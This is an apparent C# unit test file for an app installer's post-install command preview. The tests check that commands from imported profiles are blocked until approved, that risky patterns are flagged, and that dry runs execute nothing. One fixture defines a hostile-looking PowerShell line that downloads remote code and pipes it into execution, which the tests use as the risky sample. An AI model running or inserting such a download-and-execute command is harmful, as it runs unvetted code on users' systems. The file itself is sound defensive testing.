// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using System.Reflection;
using CtrlZ.Core.Install;
using CtrlZ.Core.Models;
using CtrlZ.Core.Safety;

namespace CtrlZ.Core.Tests;

public sealed class CommandPreviewTests : IDisposable
{
    private readonly string _folder = Path.Combine(Path.GetTempPath(), "ctrlz-preview-" + Guid.NewGuid().ToString("n"));

    public void Dispose()
    {
        if (Directory.Exists(_folder))
        {
            Directory.Delete(_folder, recursive: true);
        }
    }

    private static PostInstallCommand Command(bool enabled = true, bool risky = false) => risky
        ? new PostInstallCommand { Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"], Enabled = enabled }
        : new PostInstallCommand { Executable = "reg.exe", Arguments = ["import", "settings.reg"], Enabled = enabled };

    private static AppEntry App(PostInstallCommand? command) => new() { Id = "app1", Name = "Tool", PostInstall = command };

    [Fact]
    public void App_without_a_command_has_no_line()
    {
        Assert.Null(CommandPreview.ForApp(App(null), 1, ProfileOrigin.Local, approved: false));
    }

    [Theory]
    [InlineData(ProfileOrigin.Local, false, true, false, CommandRunState.Enabled, true, "Runs after install")]
    [InlineData(ProfileOrigin.Local, false, true, true, CommandRunState.Enabled, true, "Runs after install - Warning: risky pattern")]
    [InlineData(ProfileOrigin.Local, false, false, false, CommandRunState.Enabled, false, "Off in profile - will not run")]
    [InlineData(ProfileOrigin.Imported, true, true, false, CommandRunState.Approved, true, "Approved - runs after install")]
    [InlineData(ProfileOrigin.Imported, true, false, false, CommandRunState.Approved, false, "Off in profile - will not run")]
    [InlineData(ProfileOrigin.Imported, false, true, false, CommandRunState.Blocked, false, "Blocked - imported profile, review required")]
    [InlineData(ProfileOrigin.Imported, false, true, true, CommandRunState.Blocked, false, "Blocked - imported profile, review required - Warning: risky pattern")]
    [InlineData(ProfileOrigin.Unknown, false, true, false, CommandRunState.Blocked, false, "Blocked - imported profile, review required")]
    [InlineData(ProfileOrigin.Unknown, true, true, false, CommandRunState.Approved, true, "Approved - runs after install")]
    public void Line_shows_state_text_and_whether_it_will_run(
        ProfileOrigin origin, bool approved, bool enabled, bool risky,
        CommandRunState expectedState, bool expectedWillRun, string expectedText)
    {
        var line = CommandPreview.ForApp(App(Command(enabled, risky)), 3, origin, approved)!;

        Assert.Equal(expectedState, line.State);
        Assert.Equal(expectedWillRun, line.WillRun);
        Assert.Equal(expectedText, line.StateText);
        Assert.Equal(risky, line.Risky);
        Assert.Equal(3, line.Order);
    }

    [Fact]
    public void Line_shows_the_full_command_text()
    {
        var command = Command();
        command.WorkingDirectory = @"C:\Tools";
        command.RequiresElevation = true;

        var line = CommandPreview.ForApp(App(command), 1, ProfileOrigin.Local, approved: false)!;

        Assert.Equal(command.Describe(), line.CommandText);
        Assert.Contains("reg.exe import settings.reg", line.CommandText);
    }

    public static IEnumerable<object[]> AllCombinations()
    {
        foreach (var origin in new[] { ProfileOrigin.Local, ProfileOrigin.Imported, ProfileOrigin.Unknown })
        foreach (var approved in new[] { false, true })
        foreach (var enabled in new[] { false, true })
        foreach (var risky in new[] { false, true })
        {
            yield return new object[] { origin, approved, enabled, risky };
        }
    }

    [Theory]
    [MemberData(nameof(AllCombinations))]
    public void Preview_never_disagrees_with_the_gate(ProfileOrigin origin, bool approved, bool enabled, bool risky)
    {
        var origins = new ProfileOriginStore(Path.Combine(_folder, "origins.json"));
        var approvals = new PostInstallApprovalStore(Path.Combine(_folder, "approvals.json"));
        var command = Command(enabled, risky);
        var app = App(command);
        var profile = new AppProfile { Id = "p1", Apps = [app] };

        if (origin != ProfileOrigin.Unknown)
        {
            origins.Set(profile.Id, origin);
        }

        if (approved)
        {
            approvals.Approve(profile.Id, command);
        }

        var verdict = new PostInstallCommandGate(origins, approvals).EvaluateCommand(profile, app, command);
        var lines = CommandPreview.ForProfile(profile, origins.Get(profile.Id), approvals);

        Assert.Equal(verdict.MayRun, Assert.Single(lines).WillRun);
    }

    [Fact]
    public void Profile_lines_follow_the_install_order_of_enabled_apps_only()
    {
        var profile = new AppProfile
        {
            Id = "p1",
            Apps =
            [
                new AppEntry { Id = "a", Name = "A", PostInstall = Command() },
                new AppEntry { Id = "b", Name = "B", Enabled = false, PostInstall = Command() },
                new AppEntry { Id = "c", Name = "C" },
                new AppEntry { Id = "d", Name = "D", PostInstall = Command() }
            ]
        };

        var lines = CommandPreview.ForProfile(profile, ProfileOrigin.Local, isApproved: _ => false);

        Assert.Equal(new[] { "A", "D" }, lines.Select(line => line.AppName));
        Assert.Equal(new[] { 1, 3 }, lines.Select(line => line.Order));
    }

    [Fact]
    public void Dry_run_text_lists_every_command_in_full_and_says_none_ran()
    {
        var line = CommandPreview.ForApp(App(Command(risky: true)), 1, ProfileOrigin.Imported, approved: false)!;
        var report = new DryRunReport { ProfileName = "Test", Commands = [line] };

        var text = report.ToText();

        Assert.Contains("Post-install commands", text);
        Assert.Contains(line.CommandText, text);
        Assert.Contains(line.StateText, text);
        Assert.Contains("No post-install command was run", text);
    }

    [Fact]
    public void Dry_run_runner_has_no_way_to_reach_the_command_runner()
    {
        var forbidden = new[] { typeof(PostInstallRunner), typeof(PostInstallStep), typeof(InstallEngine) };
        var type = typeof(DryRunRunner);
        var fieldTypes = type.GetFields(BindingFlags.Instance | BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public)
            .Select(field => field.FieldType);
        var parameterTypes = type.GetConstructors().SelectMany(ctor => ctor.GetParameters()).Select(p => p.ParameterType);

        foreach (var used in fieldTypes.Concat(parameterTypes))
        {
            Assert.DoesNotContain(used, forbidden);
        }
    }
}
